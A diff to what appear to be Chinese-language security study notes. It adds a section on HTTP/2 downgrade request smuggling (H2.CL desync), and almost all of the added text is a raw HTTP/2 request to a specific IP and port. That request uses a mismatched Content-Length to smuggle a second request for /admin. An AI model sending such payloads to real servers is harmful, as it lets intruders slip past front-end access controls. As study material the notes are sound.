@@ -14,6 +14,26 @@
 > TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理
 
 
+### HTTP2降级走私
+
+#### H2.CL Desync
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231120003137.png)
+
+```http
+GET /admin HTTP/2
+Host: 47.108.56.168:20231
+Cookie: session=MTcwMDQwMzE0MHwzQkFoUVR6VGRNdXVoN1N6ckctMkIxVkRTd2lXU3Q0OG03bVZUd3FicWlaUG90by1WQUtWTmQyTWN4UXIyOUtDWld5ckhLUk9zcy05dEhyOVozUUd0T0VOVkpCcnBqY1h86mqqXvwUYQsIJ5OSSuJDIbysGI37BJ4sbfZC99ajuwo=
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Content-Length: 8
+
+AbcdGET /admin http/1.1: 
+Host: 47.108.56.168:20231
+
+
+```
 
 
 ## python文件上传
